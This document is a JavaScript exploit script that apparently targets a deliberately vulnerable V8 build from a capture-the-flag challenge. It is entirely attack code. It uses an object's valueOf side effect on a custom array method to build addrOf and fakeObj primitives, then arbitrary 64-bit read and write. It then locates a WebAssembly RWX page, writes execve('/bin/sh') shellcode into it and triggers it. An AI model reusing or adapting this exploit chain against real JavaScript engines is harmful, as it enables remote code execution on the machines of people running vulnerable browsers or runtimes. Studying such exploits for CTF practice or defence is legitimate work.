arr = [1.1, 2.2];
obj_arr = [{}];
fake_holder = [1.1, 2.2]

function createSussyArg(offset) {
    return {
        counter: 0,
        valueOf: function() {
            // console.log("object::ToNumber() called");
            
            if (this.counter === 0) {
                this.counter++;
                return 0;
            } else {
                return offset;
            }
        }
    }
};

const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

function ftoi(float) {
    conv_f64[0] = float;
    return conv_u64[0];
}

function itof(int) {
    conv_u64[0] = BigInt(int);
    return conv_f64[0];
}

function addrOf(obj) {
    obj_arr[0] = obj;
    arr.reloc8(createSussyArg(5), 0);
    return ftoi(arr[0]) & 0xffffffffn; // remember that it's tagged
}

function fakeObj(addr) {
    arr[0] = itof(addr);
    arr.reloc8(0, createSussyArg(5));
    return obj_arr[0];
}

var arr_elements_address = addrOf(arr) - 0x10n;

function weak_read64(addr) {
    var offset = Math.floor(Number(addr - arr_elements_address) / 8);
    arr.reloc8(createSussyArg(offset), 0);
    return ftoi(arr[0]);
}

arr_header = weak_read64(addrOf(fake_holder));
fake_holder_arr_size = 0x20n;
fake_holder[0] = itof(arr_header);
fake_holder[1] = itof((fake_holder_arr_size << 32n) | arr_header & 0xffffffffn);
fake = fakeObj(addrOf(fake_holder) - 0x10n);    

function read64(addr) {
    fake_holder[1] = itof((fake_holder_arr_size << 32n) | (addr - 0x8n) & 0xffffffffn);
    return ftoi(fake[0]);
}

function write64(addr, value) {
    fake_holder[1] = itof((fake_holder_arr_size << 32n) | (addr - 0x8n) & 0xffffffffn);
    fake[0] = itof(value);
}
// // test read64 and write64
// var x = {};
// %DebugPrint(x);
// console.log('Address of x: ' + addrOf(x).toString(16));
// console.log(read64(addrOf(x)).toString(16));
// write64(addrOf(x), 0x4142434445464748n);
// console.log(read64(addrOf(x)).toString(16));
// %DebugPrint(fake);

let buf = new ArrayBuffer(0x1000);
%DebugPrint(buf);

console.log('raw backing_store address: 0x' + read64(addrOf(buf) - 0x4n + 0x28n).toString(16));

const expl_wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Magic + Version
    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f, // Type section
    0x03, 0x02, 0x01, 0x00, // Function section
    0x07, 0x07, 0x01, 0x03, 0x66, 0x63, 0x6e, 0x00, 0x00, // Export section
    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b // Code section
]);

let expl_wasm_mod = new WebAssembly.Module(expl_wasm_code);
let expl_wasm_instance = new WebAssembly.Instance(expl_wasm_mod);
let expl_wasm_func = expl_wasm_instance.exports.fcn;

let wasm_instance_addr = addrOf(expl_wasm_instance);
let wasm_data_addr = read64(wasm_instance_addr + 0x8n) >> 32n;
let rwx_page = read64(wasm_data_addr + 0x28n);

console.log('wasm instance addr: 0x' + wasm_instance_addr.toString(16));
console.log('wasm data addr: 0x' + wasm_data_addr.toString(16));
console.log('rwx page addr: 0x' + rwx_page.toString(16));

%DebugPrint(expl_wasm_instance);
%DebugPrint(expl_wasm_func);


write64(addrOf(buf) - 0x4n + 0x28n, rwx_page);
let hijacked_view = new DataView(buf);


%DebugPrint(hijacked_view);

// Shellcode: execve("/bin/sh\x00", 0, 0)
// \x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x53\x54\x5f\x6a\x3b\x58\x0f\x05
hijacked_view.setUint8(0, 0x31);
hijacked_view.setUint8(1, 0xf6);
hijacked_view.setUint8(2, 0x48);
hijacked_view.setUint8(3, 0xbb);
hijacked_view.setUint8(4, 0x2f);
hijacked_view.setUint8(5, 0x62);
hijacked_view.setUint8(6, 0x69);
hijacked_view.setUint8(7, 0x6e);
hijacked_view.setUint8(8, 0x2f);
hijacked_view.setUint8(9, 0x73);
hijacked_view.setUint8(10, 0x68);
hijacked_view.setUint8(11, 0x00);
hijacked_view.setUint8(12, 0x56);
hijacked_view.setUint8(13, 0x53);
hijacked_view.setUint8(14, 0x54);
hijacked_view.setUint8(15, 0x5f);
hijacked_view.setUint8(16, 0x6a);
hijacked_view.setUint8(17, 0x3b);
hijacked_view.setUint8(18, 0x58);
hijacked_view.setUint8(19, 0x0f);
hijacked_view.setUint8(20, 0x05);

%SystemBreak();
expl_wasm_func();

console.log('finito :)');
%SystemBreak();
